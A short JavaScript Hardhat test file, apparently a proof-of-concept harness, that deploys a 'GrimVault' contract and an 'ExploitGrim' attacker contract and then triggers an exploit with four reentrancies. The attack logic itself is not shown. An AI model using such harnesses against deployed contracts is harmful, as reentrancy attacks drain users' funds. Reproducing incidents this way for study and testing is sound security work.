const { expect } = require("chai");

describe("Greeter", function() {
  let deployer, attacker;

  const TOKENS = ethers.utils.parseEther('1000000');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [attacker, deployer] = await ethers.getSigners();

    const GrimVault = await ethers.getContractFactory('GrimVault', deployer);
    this.vault = await GrimVault.deploy('G-BTC-RBT', 'G-BTC-RBT', 86400);    
  });

  it('Exploit', async function () {
    const Exploit = await ethers.getContractFactory('ExploitGrim', deployer);
    const exploit = await Exploit.deploy(this.vault.address);

    // 4 reentrancies
    await exploit.exploit(4);

  });
});
